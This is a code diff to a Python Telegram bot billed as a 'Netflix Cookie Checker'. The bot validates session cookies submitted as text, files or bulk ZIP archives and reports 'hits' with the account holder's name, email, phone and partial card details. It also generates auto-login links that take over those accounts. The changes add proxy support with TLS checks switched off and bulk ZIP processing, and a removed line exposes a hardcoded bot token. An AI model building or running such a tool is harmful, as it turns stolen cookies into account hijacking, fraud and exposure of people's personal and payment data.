@@ -3,10 +3,13 @@ import json
 import random
 import time
 import os
+import threading
+import requests
 import urllib3
 import urllib.parse
 from datetime import datetime
-import requests
+import zipfile
+import io
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -22,7 +25,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
 # Replace with your actual bot token, or set it via environment variables
-BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "YOUR_TELEGRAM_BOT_TOKEN"
+
+# Optional: Add user ID who can manage the bot
+ADMIN_ID = None
 
 UA_WEB = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -58,6 +64,9 @@ COUNTRY_NAMES = {
     "HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia",
     "HR":"Croatia","RS":"Serbia","BG":"Bulgaria",
 }
+
+# Variable to store current proxy
+CURRENT_PROXY = None
 
 def _djs(s):
     if not s: return ""
@@ -137,9 +146,11 @@ def generate_nftoken(netflix_id_raw, timeout=15):
 
     headers = dict(_IOS_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
+    
+    proxies = {"http": CURRENT_PROXY, "https": CURRENT_PROXY} if CURRENT_PROXY else None
 
     try:
-        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
+        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False, proxies=proxies)
         if r.status_code == 200:
             tok = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
             if tok: return str(tok)
@@ -148,6 +159,9 @@ def generate_nftoken(netflix_id_raw, timeout=15):
     try:
         sess2 = requests.Session()
         sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
+        if CURRENT_PROXY:
+            sess2.proxies = {"http": CURRENT_PROXY, "https": CURRENT_PROXY}
+            sess2.verify = False
         payload = {
             "operationName": "CreateAutoLoginToken",
             "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
@@ -176,6 +190,10 @@ def check_account(cookies: dict, timeout=20):
         "Accept-Language": "en-US,en;q=0.9",
         "DNT": "1",
     })
+    if CURRENT_PROXY:
+        sess.proxies = {"http": CURRENT_PROXY, "https": CURRENT_PROXY}
+        sess.verify = False
+        
     for k, v in cookies.items():
         sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
 
@@ -245,25 +263,39 @@ def check_account(cookies: dict, timeout=20):
     }
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
+    help_text = (
         "👋 <b>Welcome to Netflix Cookie Checker Bot!</b>\n\n"
-        "Send me your cookie string as a text message, or upload a <code>.txt</code> file containing your cookies.",
-        parse_mode="HTML"
+        "Send me your cookie string as a text message, or upload a file containing your cookies.\n\n"
+        "<b>Supported formats:</b>\n"
+        "1. Netscape/JSON cookies text\n"
+        "2. <code>.txt</code> or <code>.json</code> documents\n"
+        "3. <code>.zip</code> archives (I'll extract and check all text/json files inside)\n\n"
     )
+    if ADMIN_ID and update.effective_user.id == ADMIN_ID:
+        help_text += "<b>Admin commands:</b>\n/setproxy http://ip:port\n/proxy"
+    await update.message.reply_text(help_text, parse_mode="HTML")
 
-async def handle_cookie_processing(update: Update, cookie_text: str):
-    # Temporary status message
-    status_msg = await update.message.reply_text("⚡ <i>Checking cookies against Netflix services...</i>", parse_mode="HTML")
-    
-    cookies = load_cookies(cookie_text)
-    if not cookies:
-        await status_msg.edit_text("❌ <b>Could not parse any valid cookies out of your text!</b>", parse_mode="HTML")
+async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global CURRENT_PROXY
+    if ADMIN_ID and update.effective_user.id != ADMIN_ID: return
+    if not context.args:
+        await update.message.reply_text("Usage: /setproxy http://user:pass@ip:port")
         return
+    proxy = context.args[0]
+    if not proxy.startswith(('http://', 'https://')): proxy = "http://" + proxy
+    CURRENT_PROXY = proxy
+    await update.message.reply_text(f"Proxy set to: <code>{CURRENT_PROXY}</code>", parse_mode="HTML")
 
+async def get_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if ADMIN_ID and update.effective_user.id != ADMIN_ID: return
+    proxy_status = CURRENT_PROXY if CURRENT_PROXY else "Not set"
+    await update.message.reply_text(f"Current proxy: <code>{proxy_status}</code>", parse_mode="HTML")
+
+async def process_and_send_result(update, status_msg, cookies):
     result = check_account(cookies)
     if not result:
         await status_msg.edit_text("❌ <b>BAD / Expired / Invalid Cookie.</b>", parse_mode="HTML")
-        return
+        return False
 
     # Delete processing status and frame up hit report
     await status_msg.delete()
@@ -305,38 +337,135 @@ async def handle_cookie_processing(update: Update, cookie_text: str):
         reply_markup=InlineKeyboardMarkup(buttons),
         parse_mode="HTML"
     )
+    return True
 
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await handle_cookie_processing(update, update.message.text)
-
-async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if not doc.file_name.lower().endswith(('.txt', '.json')):
-        await update.message.reply_text("⚠️ Please send your cookies in a valid <code>.txt</code> or <code>.json</code> document.", parse_mode="HTML")
+    status_msg = await update.message.reply_text("⚡ <i>Checking cookies...</i>", parse_mode="HTML")
+    cookies = load_cookies(update.message.text)
+    if not cookies:
+        await status_msg.edit_text("❌ <b>Could not parse valid cookies from text!</b>", parse_mode="HTML")
         return
-        
-    file_obj = await context.bot.get_file(doc.file_id)
-    file_bytes = await file_obj.download_as_bytearray()
+    await process_and_send_result(update, status_msg, cookies)
+
+async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    fn = doc.file_name.lower()
     
-    try:
-        cookie_text = file_bytes.decode('utf-8', errors='ignore')
-        await handle_cookie_processing(update, cookie_text)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to decode file contents: {str(e)}")
+    if fn.endswith(('.txt', '.json')):
+        status_msg = await update.message.reply_text("⚡ <i>Checking file cookies...</i>", parse_mode="HTML")
+        file_obj = await context.bot.get_file(doc.file_id)
+        file_bytes = await file_obj.download_as_bytearray()
+        try:
+            cookie_text = file_bytes.decode('utf-8', errors='ignore')
+            cookies = load_cookies(cookie_text)
+            if not cookies:
+                await status_msg.edit_text("❌ <b>Could not parse valid cookies from file!</b>", parse_mode="HTML")
+                return
+            await process_and_send_result(update, status_msg, cookies)
+        except Exception as e:
+            await status_msg.edit_text(f"❌ Decode error: {str(e)}")
+
+    elif fn.endswith('.zip'):
+        status_msg = await update.message.reply_text("⚡ <i>Checking ZIP archive... This may take time.</i>", parse_mode="HTML")
+        file_obj = await context.bot.get_file(doc.file_id)
+        file_bytes = await file_obj.download_as_bytearray()
+        
+        hits = 0
+        total_checks = 0
+        errors = 0
+        
+        try:
+            with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as zip_ref:
+                # Filter text/json files and ignore folders
+                files_to_check = [f for f in zip_ref.namelist() if f.lower().endswith(('.txt', '.json')) and not f.endswith('/')]
+                total_files = len(files_to_check)
+                
+                if total_files == 0:
+                    await status_msg.edit_text("❌ <b>No .txt or .json files found in ZIP archive.</b>", parse_mode="HTML")
+                    return
+                
+                # Dynamic status update every X seconds
+                last_status_update = time.time()
+                
+                for i, file_name in enumerate(files_to_check):
+                    total_checks += 1
+                    try:
+                        with zip_ref.open(file_name) as f:
+                            content = f.read().decode('utf-8', errors='ignore')
+                            cookies = load_cookies(content)
+                            if not cookies: continue
+                            
+                            # check account (sequential)
+                            result = check_account(cookies)
+                            
+                            if result:
+                                hits += 1
+                                # Frame up and send report (same function)
+                                flag  = _flag(result["country_code"])
+                                profs = ", ".join(result["profiles"][:4]) if result["profiles"] else "N/A"
+                                pv    = "✅" if result["phone_verified"] else "❌"
+                                cookie_val = f"NetflixId={result['netflix_id_raw']}" if result['netflix_id_raw'] else "Raw cookie in ZIP"
+
+                                caption = (
+                                    f"🎬 <b>ZIP HIT #{hits}</b>\n"
+                                    f"📄 File: <code>{file_name}</code>\n\n"
+                                    f"👤 <b>{result['name']}</b>\n"
+                                    f"📧 <code>{result['email']}</code>\n"
+                                    f"🌍 {result['country']} {flag} ({result['country_code']})\n\n"
+                                    f"📋 <b>{result['plan']}</b>  •  💰 {result['price']}\n"
+                                    f"📅 Since: {result['member_since']}\n"
+                                    f"🗓 Billing: {result['next_billing']}\n\n"
+                                    f"🎥 {result['video_quality']}  |  📺 {result['max_streams']} streams\n"
+                                    f"💳 {result['card_brand']} *{result['card_last4']}  •  {result['payment_method']}\n"
+                                    f"📞 {result['phone']}  {pv}\n"
+                                    f"👥 Profiles ({result['profile_count']}): {profs}\n\n"
+                                    f"🍪 <b>Cookie</b>\n"
+                                    f"<code>{cookie_val}</code>"
+                                )
+
+                                buttons = []
+                                row1 = []
+                                if result.get("login_pc") and result["login_pc"] != "N/A":
+                                    row1.append(InlineKeyboardButton("🖥 PC", url=result["login_pc"]))
+                                if result.get("login_phone") and result["login_phone"] != "N/A":
+                                    row1.append(InlineKeyboardButton("📱 Phone", url=result["login_phone"]))
+                                if row1: buttons.append(row1)
+                                buttons.append([InlineKeyboardButton("📺 TV", url=result["login_tv"])])
+
+                                await update.message.reply_text(text=caption, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
+                            
+                    except Exception: errors += 1
+                    
+                    # Update status message every 5 seconds
+                    if time.time() - last_status_update > 5:
+                        progress = (total_checks / total_files) * 100
+                        await status_msg.edit_text(f"⏳ <i>Processing ZIP: {total_checks}/{total_files} ({progress:.1f}%)\nHits: {hits} | Errors: {errors}...</i>", parse_mode="HTML")
+                        last_status_update = time.time()
+                
+            await status_msg.edit_text(f"✅ <b>ZIP Process Complete</b>\n\nChecked: {total_checks}\nHits: {hits}\nErrors: {errors}", parse_mode="HTML")
+            
+        except zipfile.BadZipFile: await status_msg.edit_text("❌ <b>File is not a valid ZIP archive.</b>", parse_mode="HTML")
+        except Exception as e: await status_msg.edit_text(f"❌ ZIP processing error: {str(e)}")
+
+    else:
+        await update.message.reply_text("⚠️ Supported files: <code>.txt</code>, <code>.json</code>, <code>.zip</code>", parse_mode="HTML")
 
 def main():
     if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
-        print("[!] Please provide a valid Telegram token inside the script.")
+        print("[!] Provide valid token in environment variable 'BOT_TOKEN' or inside the script.")
         return
 
-    print("[*] Launching Asynchronous Telegram Client...")
+    print(f"[*] Starting Async Telegram Client (v20+ architecture)...")
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("setproxy", set_proxy))
+    app.add_handler(CommandHandler("proxy", get_proxy))
+    
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
 
-    print("[+] Bot is pooling active updates. Send a text/document via Telegram to parse.")
+    print("[+] Bot is pooling updates. Ready.")
     app.run_polling()
 
 if __name__ == "__main__":
